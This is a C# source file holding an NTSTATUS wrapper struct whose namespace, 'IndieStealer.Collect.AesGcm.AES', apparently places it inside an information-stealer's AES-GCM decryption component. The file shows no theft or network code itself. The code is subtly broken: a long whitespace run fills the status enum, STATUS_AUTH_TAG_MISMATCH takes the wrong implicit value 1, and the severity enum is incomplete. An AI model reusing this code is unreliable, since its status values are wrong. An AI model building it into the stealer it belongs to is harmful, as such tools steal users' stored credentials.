using System;
using System.Diagnostics;

namespace IndieStealer.Collect.AesGcm.AES
{
	public struct NTSTATUS : IComparable, IComparable<NTSTATUS>, IEquatable<NTSTATUS>, IFormattable
	{
		public Code Value { get; }
		[DebuggerBrowsable(0)]
		public int AsInt32
		{
			get
			{
				return (int)Value;
			}
		}
		public uint AsUInt32
		{
			get
			{
				return (uint)Value;
			}
		}
		public SeverityCode Severity
		{
			get
			{
				return (SeverityCode)(AsUInt32 & 3221225472U);
			}
		}
		
		public static explicit operator int(NTSTATUS status)
		{
			return status.AsInt32;
		}
		public static implicit operator uint(NTSTATUS status)
		{
			return status.AsUInt32;
		}
								
		public bool Equals(NTSTATUS other)
		{
			return Value == other.Value;
		}

		public int CompareTo(object obj)
		{
			return Value.CompareTo(obj);
		}
		public int CompareTo(NTSTATUS other)
		{
			return Value.CompareTo(other.Value);
		}

		public string ToString(string format, IFormatProvider formatProvider)
		{
			return AsUInt32.ToString(format, formatProvider);
		}
		private const uint SeverityMask = 3221225472U;
		private const int SeverityShift = 30;
		private const uint CustomerCodeMask = 536870912U;
		private const int CustomerCodeShift = 29;
		private const uint FacilityMask = 268369920U;
		private const int FacilityShift = 16;
		private const uint FacilityStatusMask = 65535U;
		private const int FacilityStatusShift = 0;
		public enum Code : uint
		{
			STATUS_SUCCESS,			
			STATUS_AUTH_TAG_MISMATCH,
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																													}
		public enum SeverityCode : uint
		{
			STATUS_SEVERITY_SUCCESS,
			STATUS_SEVERITY_INFORMATIONAL = 1073741824U,
		}
		
	}
}
